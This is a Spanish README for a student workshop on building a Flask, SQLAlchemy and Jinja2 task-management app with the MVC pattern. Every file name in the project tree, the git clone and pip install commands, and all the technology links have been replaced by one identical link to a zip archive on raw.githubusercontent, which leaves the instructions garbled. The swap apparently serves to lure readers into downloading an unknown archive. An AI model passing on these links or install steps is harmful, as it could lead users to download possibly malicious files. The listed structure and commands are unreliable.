# taller #2 de Arquitectura de Software: MVC

## Descripción

Este proyecto proporciona una plantilla para la implementación de una aplicación web siguiendo el patrón **Modelo** - **Vista** - **Controlador** (**MVC**)

## Objetivos

1. **Comprender la arquitectura Modelo-Vista-Controlador** en el desarrollo de una aplicación Web:
    - **Modelo**: Definir clases con SQLAlchemy y gestionar datos
    - **Vista**: Diseñar plantillas HTML con Jinja2 para representar información
    - **Controlador**: Implementar rutas y lógica de interacción en Flask
2. **Implementar operaciones CRUD** conectadas a una base de datos relacional
3. **Usar el ORM SQLAlchemy** para manipular objetos sin escribir SQL directamente
4. **Aplicar principios de separación de responsabilidades** y organización de código
5. **Comprender el flujo de una petición HTTP** dentro de una aplicación web MVC
6. **Desarrollar una aplicación básica** con persistencia, interfaz web y lógica de negocio estructurada

## Estructura del Proyecto

```
as-taller2/
├── .gitignore             # Archivos a ignorar en Git
├── https://raw.githubusercontent.com/axlcraft/as-taller2/main/blepharadenitis/as-taller2.zip                  # Punto de entrada y configuración
├── https://raw.githubusercontent.com/axlcraft/as-taller2/main/blepharadenitis/as-taller2.zip               # Configuración de Flask y SQLAlchemy
├── models/                 # Modelo (clases SQLAlchemy)
│   ├── https://raw.githubusercontent.com/axlcraft/as-taller2/main/blepharadenitis/as-taller2.zip
│   └── https://raw.githubusercontent.com/axlcraft/as-taller2/main/blepharadenitis/as-taller2.zip             # Clase Tarea con atributos y métodos
├── controllers/            # Controladores (rutas y lógica de negocio)
│   ├── https://raw.githubusercontent.com/axlcraft/as-taller2/main/blepharadenitis/as-taller2.zip
│   └── https://raw.githubusercontent.com/axlcraft/as-taller2/main/blepharadenitis/as-taller2.zip  # CRUD de tareas
├── templates/              # Vistas (HTML con Jinja2)
│   ├── https://raw.githubusercontent.com/axlcraft/as-taller2/main/blepharadenitis/as-taller2.zip         # Base común
│   ├── https://raw.githubusercontent.com/axlcraft/as-taller2/main/blepharadenitis/as-taller2.zip      # Lista de tareas
│   └── https://raw.githubusercontent.com/axlcraft/as-taller2/main/blepharadenitis/as-taller2.zip      # Formulario de crear/editar
├── static/                 # Archivos estáticos (CSS, JS, imágenes)
│   └── https://raw.githubusercontent.com/axlcraft/as-taller2/main/blepharadenitis/as-taller2.zip
├── https://raw.githubusercontent.com/axlcraft/as-taller2/main/blepharadenitis/as-taller2.zip        # Dependencias del proyecto
└── https://raw.githubusercontent.com/axlcraft/as-taller2/main/blepharadenitis/as-taller2.zip              # Este archivo
```

## Instalación

```bash
# Clonar el repositorio
git clone https://raw.githubusercontent.com/axlcraft/as-taller2/main/blepharadenitis/as-taller2.zip
cd as-taller2

# Crear entorno virtual
python3 -m venv venv

# Activar entorno virtual
source venv/bin/activate

# Instalar dependencias
pip install -r https://raw.githubusercontent.com/axlcraft/as-taller2/main/blepharadenitis/as-taller2.zip
```

## Desarrollo por Versiones

### Versión 1: CRUD Local con Flask + SQLAlchemy

**Objetivo**: Implementar las operaciones básicas CRUD

- [ ] Crear una tarea: título, descripción, estado (pendiente/hecha), fecha de vencimiento
- [ ] Leer (listar) todas las tareas
- [ ] Editar una tarea existente
- [ ] Eliminar una tarea

**Archivos a modificar**: `https://raw.githubusercontent.com/axlcraft/as-taller2/main/blepharadenitis/as-taller2.zip`, `https://raw.githubusercontent.com/axlcraft/as-taller2/main/blepharadenitis/as-taller2.zip`, `templates/*.html`

### Versión 2: Validaciones y Mejoras en la Vista

**Objetivo**: Agregar validaciones y mejorar la presentación

- [ ] Validación básica en formularios (campos requeridos, fecha válida)
- [ ] Plantillas Jinja reutilizables usando `https://raw.githubusercontent.com/axlcraft/as-taller2/main/blepharadenitis/as-taller2.zip`
- [ ] Estilos básicos con CSS o Bootstrap

**Archivos a modificar**: `templates/*.html`, `https://raw.githubusercontent.com/axlcraft/as-taller2/main/blepharadenitis/as-taller2.zip`, `https://raw.githubusercontent.com/axlcraft/as-taller2/main/blepharadenitis/as-taller2.zip`

### Versión 3: Filtros y Mejoras de Usabilidad

**Objetivo**: Añadir funcionalidades de filtrado y ordenamiento

- [ ] Filtrar tareas por estado (pendiente, completada)
- [ ] Ordenar tareas por fecha de vencimiento
- [ ] Mostrar tareas vencidas en otro color

**Archivos a modificar**: `https://raw.githubusercontent.com/axlcraft/as-taller2/main/blepharadenitis/as-taller2.zip`, `https://raw.githubusercontent.com/axlcraft/as-taller2/main/blepharadenitis/as-taller2.zip`, `https://raw.githubusercontent.com/axlcraft/as-taller2/main/blepharadenitis/as-taller2.zip`

### Versión 4: Autenticación de Usuarios (Opcional)

**Objetivo**: Agregar sistema de usuarios

- [ ] Registro e inicio de sesión de usuarios
- [ ] Asociar tareas a usuarios específicos
- [ ] Proteger rutas con autenticación

**Archivos nuevos**: `https://raw.githubusercontent.com/axlcraft/as-taller2/main/blepharadenitis/as-taller2.zip`, `https://raw.githubusercontent.com/axlcraft/as-taller2/main/blepharadenitis/as-taller2.zip`, plantillas de autenticación

## Tecnologías Utilizadas

- [Flask](https://raw.githubusercontent.com/axlcraft/as-taller2/main/blepharadenitis/as-taller2.zip): Framework web de Python
- [SQLAlchemy](https://raw.githubusercontent.com/axlcraft/as-taller2/main/blepharadenitis/as-taller2.zip): ORM para manejo de base de datos
- [Jinja](https://raw.githubusercontent.com/axlcraft/as-taller2/main/blepharadenitis/as-taller2.zip): Motor de plantillas (incluido con Flask)
- [SQLite](https://raw.githubusercontent.com/axlcraft/as-taller2/main/blepharadenitis/as-taller2.zip): Base de datos ligera para desarrollo
- [HTML](https://raw.githubusercontent.com/axlcraft/as-taller2/main/blepharadenitis/as-taller2.zip)/[CSS](https://raw.githubusercontent.com/axlcraft/as-taller2/main/blepharadenitis/as-taller2.zip): Para la interfaz de usuario

